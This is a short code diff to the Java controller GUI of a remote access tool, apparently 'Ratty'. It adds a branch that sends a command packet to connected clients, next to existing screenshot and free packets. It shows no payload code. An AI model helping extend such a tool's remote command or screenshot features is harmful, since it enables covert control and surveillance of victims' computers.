@@ -5,6 +5,7 @@ import java.util.ArrayList;
 
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
+import de.sogomn.rat.packet.CommandPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
@@ -55,6 +56,8 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			return new FreePacket();
 		} else if (actionCommand == RattyGui.SCREENSHOT) {
 			return new ScreenshotPacket();
+		} else if (actionCommand == RattyGui.COMMAND) {
+			return CommandPacket.create();
 		}
 		
 		return null;
